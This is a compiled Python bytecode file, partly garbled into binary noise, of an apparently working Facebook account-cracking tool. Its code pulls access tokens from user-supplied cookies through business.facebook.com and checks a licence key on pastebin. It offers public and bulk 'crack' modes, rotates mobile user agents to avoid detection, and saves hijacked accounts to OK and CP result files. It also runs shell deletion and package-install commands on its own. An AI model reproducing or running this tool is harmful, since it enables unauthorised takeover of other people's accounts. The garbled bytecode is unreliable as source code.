o
    ���b��  �                   @   sr  d dl Z d dlZd dlZd dlZe �d� e �d� e �d� edd�ZeD ]Ze�� Z	q&dd� Z
e
�  d dlZd dlZd dlZd dl Z d dlZd dlZd dlZd dlZd dlZzd dlZW n' ey�   e �d	� e�d
� zd dlZW n ey�   ed� Y nw Y nw d dlZd dlZd dlZd dl Z d dlZd dlZd dlZd dlZd dlZzd dlZW n' ey�   e �d	� e�d
� zd dlZW n ey�   ed� Y nw Y nw d dlmZ d dlmZ d dlmZ d dlmZ d dlmZ  d dl!m"Z# d dlm$Z% d dl&m'Z( d dl&m'Z( d dl)m*Z+ zedd��,� �-� Z.W n   g d�Z.Y zedd��,� �-� Z/W n   dgZ/Y g g d d d g g g g g g g g f\Z0Z1a2a3a4Z5Z6Z7Z8Z9Z:ZZ;dZ<dZ=dZ>dZ?dZ@dZAd ZBd!ZCd"d#iZDd$d%d&d'd(d)d*d+d,d-d.d/d0�ZEd$d%d&d'd(d)d*d+d,d-d.d/d1�ZFd2ZGd3ZHd4ZId5ZJd6ZKej�L� jMZNeEeOej�L� jP� ZQej�L� jRZSd7eOeN� d8 eOeQ� d8 eOeS� d9 ZTd:eOeN� d8 eOeQ� d8 eOeS� d9 ZUd;d� ZVd<d=� ZWd>d?� ZXd@dA� ZYdBdC� ZZdDdE� Z[dFdG� Z\dHdI� Z]dJdK� Z^dLdM� Z_dNdO� Z`dPdQ� ZadRdS� ZbdTdU� ZcdVdW� ZddXdY� ZedZd[� Zfegd\k�r7ze �hd]� W n   Y ze �hd^� W n   Y eY�  dS dS )_�    N�clearzrm -rf list.txtzLDVIP -u > list.txtzlist.txt�rc                  C   s�   t t�� �t t�� � } d�| �}td| � z,t�d�j}||v r4td� t t�� �}t	�
d� W d S td� t	�
d� t��  W d S    t��  tdkrYtt� t�  Y d S Y d S )N�-z

[37;1m  YOUR ID : zhttps://pastebin.com/7MHy9yFkz+[92m  YOUR Your ID IS ACTIVE.........[97m�   ze[91m

  ID Ta ACTIVE NiNA  
  Bo Active KrNa ID Xo 
  NaMake FreKa XaSs 
  TeleGram :: @FFRFF3 [97m�__main__)�str�os�geteuid�getlogin�join�print�requests�get�text�time�sleep�sys�exit�nameZlogo�chk)�uuidZLDVIP�msg� r   �&/storage/emulated/0/Download/DECccc.pyr      s&   


�r   zpip install richr   zKTidak Dapat Menginstall Module rich, Coba Install Manual (pip install rich)zACannot Install Module rich, Try Manual Install (pip install rich))�Table)�Console)�BeautifulSoup)�ThreadPoolExecutor)�Group)�Panel)r   )�Markdown)�Columnszuser.txt)dzzMozilla/5.0 (Linux; Android 10; vivo 1935) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 5.1.1; F1f Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 9; vivo 1901 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/6.9.10.2	 z�Mozilla/5.0 (Linux; U; Android 8.1.0; en-US; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/13.2.5.1300 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 6.0; CPH1609 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36 mCent/0.13.1214z�Mozilla/5.0 (Linux; Android 5.1.1; A37fw Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36z�Mozilla/5.0 (Linux; U; Android 7.1.1; CPH1717 Build/N4F26M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.96 Mobile Safari/537.36 OPR/50.0.2254.149182z�Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36��Mozilla/5.0 (Linux; Android 7.1.1; CPH1801 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.68 Mobile Safari/537.36z�Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1819 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.116 Mobile Safari/537.36 HeyTapBrowser/15.7.8.1��Mozilla/5.0 (Linux; Android 7.1.1; CPH1723 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.123 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 5.1.1; A33fw Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.81 Mobile Safari/537.36z�Mozilla/5.0 (Linux; U; Android 7.1.1; zh-CN; OPPO R11 Build/NMF26X) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.1.4.994 Mobile Safari/537.36z�Mozilla/5.0 (Linux; U; Android 5.1; in-ID; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.10.0.1163 UCTurbo/1.9.8.900 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 9; vivo 1906 Build/PKQ1.190616.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/6.3.6.2	 z�Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.132 Mobile Safari/537.36 OPR/52.2.2254.54723z�Mozilla/5.0 (Linux; Android 10; V2032; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/6.0.4.2	 z�Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 OPR/51.0.2254.150807��Mozilla/5.0 (Linux; U; Android 7.1.1; en-us; CPH1729 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 OppoBrowser/15.6.3.2��Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026; rv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Rocket/2.5.1(20460) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; U; Android 8.1.0; en-US; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 UCBrowser/13.3.2.1303 Mobile Safari/537.36r%   z�Mozilla/5.0 (Linux; Android 5.1; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36z�Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/46.0.2490.76 Mobile Safari/537.36 OPR/47.1.2254.147528z�Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.110 Mobile Safari/537.36 OPR/52.1.2254.54298z�Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36 YaApp_Android/11.01 YaSearchBrowser/11.01z�Mozilla/5.0 (Linux; U; Android 5.1; zh-cn; OPPO A59m Build/LMY47I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/1.0.0.100 U3/0.8.0 Mobile Safari/534.30 AliApp(TB/6.6.2) WindVane/8.0.0 720X1280 GCanvas/1.4.2.21z�Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/46.0.2490.76 Mobile Safari/537.36 OPR/33.0.2254.125672z�Mozilla/5.0 (Linux; U; Android 8.1.0; in-id; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.116 Mobile Safari/537.36 HeyTapBrowser/15.7.8.0.3betaz�Mozilla/5.0 (Linux; U; Android 6.0.1; en-US; CPH1701 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 UCBrowser/13.3.5.1304 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 6.0.1; CPH1701 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36r$   z�Mozilla/5.0 (Linux; U; Android 5.1; en-US; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 UCBrowser/13.3.5.1304 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 5.1.1; A37f Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.91 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 5.1; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 7.1.1; CPH1729 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36 YaApp_Android/9.99 YaSearchBrowser/9.99z�Mozilla/5.0 (Linux; Android 5.1; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; U; Android 5.1; en-US; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 UCBrowser/13.3.8.1305 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 7.1.1; CPH1729 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.96 Mobile Safari/537.36 YaApp_Android/11.01 YaSearchBrowser/11.01z�Mozilla/5.0 (Linux; Android 7.1.1; CPH1717 Build/N4F26M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.101 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.93 Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75z�Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.110 Mobile Safari/537.36 OPR/51.0.2254.150807��Mozilla/5.0 (Linux; U; Android 7.1.1; en-gb; CPH1727 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/15.5.1.10z�Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/73.0.3683.90 Mobile Safari/537.36 OPR/35.3.2254.129226z�Mozilla/5.0 (Linux; U; Android 8.1.0; id-ID; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.10.0.1163 UCTurbo/1.10.3.900 Mobile Safari/537.36z�Mozilla/5.0 (Linux; U; Android 6.0.1; en-US; CPH1701 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.13.5.1209 Mobile Safari/537.36z�Mozilla/5.0 (Linux; U; Android 7.1.1; CPH1729 Build/N6F26Q; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 Mobile Safari/537.36 OPR/51.0.2254.150807z�Mozilla/5.0 (Linux; Android 6.0; CPH1609 Build/MRA58K; in-id) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36 Puffin/9.0.0.50263APz�Mozilla/5.0 (Linux; Android 9; vivo 1904 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/6.3.6.2	 z�Mozilla/5.0 (Linux; U; Android 5.1; en-US; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/13.2.8.1301 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 5.1.1; A33fw Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36z�Mozilla/5.0 (Linux; U; Android 5.1; en-US; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/13.0.0.1288 Mobile Safari/537.36��Mozilla/5.0 (Linux; Android 5.1; A37f Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.93 Mobile Safari/537.36z�Mozilla/5.0 (Linux; U; Android 7.1.1; zh-CN; OPPO R11 Build/NMF26X) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.1.1.991 Mobile Safari/537.36NULL��Mozilla/5.0 (Linux; U; Android 7.1.1; en-US; CPH1717 Build/N4F26M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/13.0.0.1288 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.1.0; Infinix X5515F Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36z�Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.66 Mobile Safari/537.36 OPR/52.1.2254.54298z�Mozilla/5.0 (Linux; U; Android 8.1.0; en; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.10.0.1163 UCTurbo/1.10.3.900 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.141 Mobile Safari/537.36r#   z�Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.81 Mobile Safari/537.36 OPR/50.0.2254.149182z�Mozilla/5.0 (Linux; Android 7.1.1; CPH1801 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.91 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026; in-id) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36 Puffin/8.4.0.42081APz�Mozilla/5.0 (Linux; Android 5.1.1; A37f Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.158 Mobile Safari/537.36 OPR/47.1.2249.129326��Mozilla/5.0 (Linux; Android 11; V2036; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/6.9.4.4	 z�Mozilla/5.0 (Linux; Android 6.0.1; vivo 1610 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.107 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026; in-id) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36 Puffin/8.3.1.41624APz�Mozilla/5.0 (Linux; U; Android 5.1; A1601 Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.149 Mobile Safari/537.36 OPR/51.0.2254.150807z�Mozilla/5.0 (Linux; U; Android 6.0; ms-MY; vivo 1609 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.10.0.1163 UCTurbo/1.10.3.900 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.1.0; vivo 1820 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/7.4.0.0	 r&   z�Mozilla/5.0 (Linux; U; Android 5.1.1; en-US; A37f Build/LMY47V) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.0.828 U3/0.8.0 Mobile Safari/534.30z�Mozilla/5.0 (Linux; U; Android 5.1; zh-cn; OPPO A59m Build/LMY47I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/1.0.0.100 U3/0.8.0 Mobile Safari/534.30 AliApp(TB/6.7.0) WindVane/8.0.0 720X1280 GCanvas/1.4.2.21z�Mozilla/5.0 (Linux; U; Android 7.1.1; CPH1717 Build/N4F26M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.127 Mobile Safari/537.36 OPR/51.0.2254.150807z�Mozilla/5.0 (Linux; U; Android 7.1.1; en-us; CPH1729 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 OppoBrowser/15.6.0.1z�Mozilla/5.0 (Linux; U; Android 7.1.1; CPH1729 Build/N6F26Q; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.117 Mobile Safari/537.36 OPR/47.0.2254.146760z�Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Mobile Safari/537.36z�Mozilla/5.0 (Linux; U; Android 5.1.1; en-US; A37fw Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.12.3.1219 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 5.1.1; A37fw Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 5.1.1; A33f Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36z�Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/72.0.3626.105 Mobile Safari/537.36 OPR/52.2.2254.54574z�Mozilla/5.0 (Linux; U; Android 7.1.1; en-gb; CPH1729 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.116 Mobile Safari/537.36 HeyTapBrowser/15.7.8.0.1betar'   r(   ��Mozilla/5.0 (Linux; Android 7.1.1; CPH1801 Build/NMF26F; in-id) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36 Puffin/8.3.1.41624APr"   z�Mozilla/5.0 (Linux; U; Android 7.1.1; en-US; CPH1717 Build/N4F26M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/13.2.0.1296 Mobile Safari/537.36r$   r*   z�Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 OPR/51.0.2254.150807z�Mozilla/5.0 (Linux; U; Android 7.1.1; en-us; CPH1729 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 OppoBrowser/15.6.2.0.4betaz�Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36z�Mozilla/5.0 (Linux; U; Android 5.1; A1601 Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/46.0.2490.76 Mobile Safari/537.36 OPR/28.0.2254.119224z�Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.136 Mobile Safari/537.36 OPR/50.0.2254.149182z�Mozilla/5.0 (Linux; U; Android 6.0.1; en-US; OPPO R9s Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko)Version/4.0 Chrome/37.0.0.0 MQQBrowser/7.2 Mobile Safari/537.36r)   z�Mozilla/5.0 (Linux; Android 7.1.1; CPH1727 Build/N6F26Q; in-id) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36 Puffin/8.3.1.41624APz�Mozilla/5.0 (Linux; U; Android 7.1.1; CPH1729 Build/N6F26Q; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.185 Mobile Safari/537.36 OPR/51.0.2254.150807z	user2.txtz{NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+z[mz[93mz[1;92mz[32mz[95mz[33mz[1;96mz[0;34m�
user-agentz�Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]ZJanuariZFebruariZMaretZAprilZMeiZJuniZJuliZAgustusZ	SeptemberZOktoberZNovemberZDesember)�1�2�3�4�5�6�7�8�9�10�11�12)�01�02�03�04�05�06�07�08�09r5   r6   r7   zhttps://lookup-id.com/�https://mbasic.facebook.comzhttps://www.httpbin.org/ipzhttps://graph.facebook.com/{}z�Mozilla/-N29; HMSCore 6.4.0.312) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.105 HuaweiBrowser/12.0.1.302 Mobile Safari/537.36zOK-r   z.txtzCP-c                   C   s   t �d� d S )Nr   )r   �systemr   r   r   r   r   e   s   c                   C   s
   t �  d S )N)�loginr   r   r   r   �backh   s   
rD   c                   C   s   t �  tdt � d S )Nu�   %s  [0;93m	
telegram:@FFRFF3      
telegram:@FFRFF3
🏧➡️➡️➡️➡️🏧
= = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = =                                                        )r   r   �hr   r   r   r   �bannerk   s   
�rF   c                  C   s�   zjt dd��� } t dd��� }t�| � z&tjdtd  d|id�}t�|j�d }t�|j�d	 }t	||� W W d S  t
yH   t�  Y W d S  tjjyj   t�  d
}t|dd�}t� j|dd� t�  Y W d S w  tyw   t�  Y d S w )N�
.token.txtr   �.cok.txtz:https://graph.facebook.com/me?fields=id,name&access_token=r   �cookie��cookiesr   �id�2# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN�red��style�cyan)�open�read�tokenku�appendr   r   �json�loadsr   �menu�KeyError�login_lagi334�
exceptions�ConnectionErrorrF   �mark�solr   r   �IOError)�token�kukis�syZsy2Zsy3�li�lor   r   r   rC   s   s*   
��rC   c                  C   s�   zDt �  td�} tjdddddddd	d
dd�	d| id�}t�d|j�}tdd��|�	d��}tdd��| �}t
d� t�d� t�  W d S  tyj } zt�d� t�d� t
dt � t�  W Y d }~d S d }~ww )Nz[|] Cookis  : z0https://business.facebook.com/business_locationsz�Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36zhttps://www.facebook.com/zbusiness.facebook.comzhttps://business.facebook.comr,   �#id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7�	max-age=0z�text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8ztext/html; charset=utf-8)	r+   �referer�host�origin�upgrade-insecure-requests�accept-language�cache-control�accept�content-typerI   )�headersrK   z	(EAAG\w+)rG   �wr   rH   z
 b sarkaftyana daxl bozrm -f .token.txtzrm -f .cok.txtz"%s# COOKIES NA DRSTA / CP ACCOUNT )rF   �inputr   r   �re�searchr   rR   �write�groupr   r   r   r   �	Exceptionr   rB   rE   )Z___kontol___�dataZ
find_tokenZkenZcok�er   r   r   rZ   �   s    (

��rZ   c                 C   s�  z	t �d��� }W n   ddi}Y z%t�d�d }ttt�d�d � }t�d�d }|d | d | }W n   d}Y t�  d	}t|d
d�}t	� �
|� d}	t|	dd�}
tt|
dd�� ttd t d t d �}|dv rvt�  d S |dv rt�  d S |dv r�t�  d S |dv r�t�  d S |dv r�t�d� t
td t d t d � t�d� d}t	� �
t|dd�� t�  d S d}t	� �
t|dd�� t�  d S )Nzhttps://httpbin.org/ipri   r   �/r   r   �   � z# AUTHOR : @FFRFF3 z	bold bluerO   u�   ◈───[01]───🔴 CRACK ID PUBLIC 
◈───[02]───🔴 CRACK FROM MULTI ADD [ UNLIMITED ]
◈───[00]───🔴 00   LOGOUT zbold redz MENU-PROTOCOL ��title� z add : �r,   r8   �r-   r9   �r.   r:   )r/   r;   ��0Z00zrm -rf .token.txt�[�   •z
] Wait ...z# B SARKAFTYANA DARKAFTrN   �# OPTION NOT IN THE MENU)r   r   rV   Zmy_birthday�split�dic2r   rF   r]   r^   r   �nel�cetakrq   �x�p�dump_publik�dump_massal�result�filer   rB   rE   r   r   r   )Zmy_nameZmy_id�shZtglxZblnxZthnxZbirthZsgZfx�ioZoiZjh�sw�ricr   r   r   rX   �   sD   







rX   c               	   C   s�  d} t � �t| dd�� d}t|dd�}tt|dd�� ttd t d	 t d
 �}|dv �r�zt�	d�}W n t
yS   d}t � �t|dd�� t�d� t�  Y nw t|�dkrpd}t � �t|dd�� t�d� t�  d S d}t � �t|dd�� d}i }	|D ]o}
ztd|
 d��� }W n   Y q�|d7 }|dk r�dt|� }|	�t|�t|
�i� |	�|t|
�i� td| d |
 d tt|�� d t � q�|	�t|�t|
�i� tdt|� d |
 d tt|�� d t � q�d}t � �t|dd�� ttd t d	 t d �}z|	| }W n t�y+   d}t � �t|dd�� t�  Y nw ztd| d��� }W n   d }t � �t|dd�� t�d� t�  Y d!}t � �t|dd�� t�d"| �}d!}t � �t|dd�� ttd t d# t d$ � t�  d S |d%v �r�zt�	d&�}W n t
�y�   d}t � �t|dd�� t�d� t�  Y nw t|�dk�r�d'}t � �t|dd�� t�d� t�  d S d(}t � �t|dd�� d}i }	|D ]s}
ztd)|
 d��� }W n   Y �q�|d7 }|d*k �r+dt|� }|	�t|�t|
�i� |	�|t|
�i� td| d |
 d+ tt|�� d t � �q�|	�t|�t|
�i� tdt|� d |
 d+ tt|�� d t � �q�d}t � �t|dd�� ttd t d	 t d, �}z|	| }W n t�y�   d-}t � �t|dd�� t�  Y nw ztd)| d��� }W n   d }t � �t|dd�� t�d� t�  Y d.}t � �t|dd�� t�d/| �}d.}t � �t|dd�� ttd t d# t d$ � t�  d S |d0v �r�t�  d S d}t � �t|dd�� t�  d S )1Nz# CHECK CRACK RESULT �greenrO   z<[01] Check Cp Results
[02] Check Ok Result
[00] Back to MenurQ   ZRESULTSr|   r�   �fz] select : r   �CPz# DIRECTORY NOT FOUNDrN   rz   r   z# YOU DONT HAVE CP RESULT�yellowz# YOUR CP RESULT�CP/r   r   �
   r�   �] u   ...🏧 z Account� ---> z# SELECT RESULTS TO DISPLAYz] Select : r�   z%# FILE NOT FOUND, CHECK AND TRY AGAINz# LIST YOUR CP ACCOUNTzcd CP && cat r�   z] Returnr�   �OKz# YOU DONT HAVE OK RESULTSz# YOUR OK RESULT�OK/�d   z... z
] Pilih : z# OPTION NOT IN THE MENU z# LIST YOUR OK ACCOUNTzcd OK && cat r�   )r^   r   r]   r�   r�   rq   r�   r�   r   �listdir�FileNotFoundErrorr   r   rD   �lenrR   �	readlinesr   �updaterY   r   rS   rB   rE   )�cekZkayesZkisZkzZvinZgadaZhahaZgerr�cih�lol�isi�hem�nomZgerr2�geeh�gehr�   Zlin�hehe�akunZhusZakun2r   r   r   r�   �   s�   


�


.2
�




�


04
�




r�   c                  C   s4  d} t � jt| dd�dd� ttd t d t d � t�d� d	}t � �t|dd�� g }zt�d
�}|D ]}|�|� q7W n   Y zt�d�}|D ]}|�|� qMW n   Y t	|�dkrrd}t � �t|dd�� t
�  d S d}i }	|D ]�}
ztd|
 d��� }W n   ztd|
